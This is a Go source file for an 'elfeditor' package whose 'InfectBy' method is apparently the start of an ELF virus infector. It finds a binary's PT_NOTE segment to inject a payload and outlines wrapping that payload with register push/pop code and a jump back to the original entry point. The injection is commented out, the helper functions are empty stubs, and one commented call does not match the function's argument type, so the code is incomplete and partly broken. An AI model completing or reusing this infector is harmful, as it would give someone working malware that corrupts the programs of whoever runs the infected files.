package elfeditor

import (
	"bytes"
	"debug/elf"
	"fmt"
	"io/fs"
	"io/ioutil"
)

type File struct {
	data []byte
	elf  *elf.File
}

func NewFileCopy(name string) (*File, error) {
	data, err := ioutil.ReadFile(name)
	if err != nil {
		return nil, err
	}
	elfFile, err := elf.NewFile(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	if err = elfFile.Close(); err != nil {
		return nil, err
	}
	return &File{
		data: data,
		elf:  elfFile,
	}, nil
}

func (f *File) SaveAs(name string, perm fs.FileMode) error {
	return ioutil.WriteFile(name, f.data, perm)
}

func (f *File) InfectBy(payload *File) error {
	if f.elf.FileHeader != payload.elf.FileHeader {
		return fmt.Errorf("target and payload not compatible")
	}
	noteIndex := f.findNoteSegment()
	if noteIndex < 0 {
		return fmt.Errorf("segment PT_NOTE not find in a target")
	}
	//var err error

	//payload, err = f.enrichPayload(payload)
	//if err != nil {
	//	return err
	//}
	//f.data = append(f.data, payload...)
	return nil
}

func (f *File) findNoteSegment() int {
	for i, segment := range f.elf.Progs {
		if segment.Type == elf.PT_NOTE {
			return i
		}
	}
	return -1
}

func (f *File) enrichPayload(payload []byte) ([]byte, error) {
	pushingAllRegisters, popingAllRegister, err := f.getPushPopRegisters()
	if err != nil {
		return nil, err
	}
	jumpingToOldEntryPoint, err := f.getJumpToOldEntryPoint()
	if err != nil {
		return nil, err
	}

	payload = append(pushingAllRegisters, payload...)
	payload = append(payload, popingAllRegister...)
	payload = append(payload, jumpingToOldEntryPoint...)
	return payload, nil
}

func (f *File) getPushPopRegisters() (push, pop []byte, err error) {
	// push all general registers (intel assembler)
	//
	//  push rax
	//  push rcx
	//  push rdx
	//  push r8
	//  push r11
	return nil, nil, nil
}

func (f *File) getJumpToOldEntryPoint() ([]byte, error) {
	return nil, nil
}
